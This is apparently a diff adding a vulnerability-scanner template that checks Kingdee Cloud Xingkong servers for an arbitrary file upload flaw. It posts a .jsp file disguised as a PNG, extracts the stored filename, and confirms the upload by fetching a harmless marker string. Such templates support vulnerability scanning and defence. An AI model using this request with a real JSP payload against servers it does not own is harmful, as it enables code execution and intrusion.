@@ -1,0 +1,69 @@
+id: kindee-scpsupreghandler-fileupload
+info:
+  name: 金蝶云星空ScpSupRegHandler任意文件上传
+  author: htq
+  severity: critical
+
+http:
+  - raw:
+      - |
+        POST /plt_portal/setting/uploadLogo.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        X-Forwarded-For: 
+        Content-Length: 632
+        Content-Type: multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62
+
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="chooseLanguage_top"; filename="chooseLanguage_top"
+
+        ch
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="dataCenter"; filename="dataCenter"
+
+        xx
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="insId"; filename="insId"
+
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="type"; filename="type"
+
+        top
+        --04844569c7ca7d21a3ca115dca477d62
+        Content-Disposition: form-data; name="upload"; filename="test.jsp"
+        Content-Type: image/png
+
+        Hello11123
+        --04844569c7ca7d21a3ca115dca477d62--
+
+    extractors:
+      - type: regex
+        part: body
+        name: filename
+        internal: true
+        regex:
+          - "\"(\\d{16}\\.jsp)\""
+        group: 1
+
+  - raw:
+      - |
+        GET /portal/res/file/upload/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Hello11123"
+      - type: status
+        status:
+          - 200
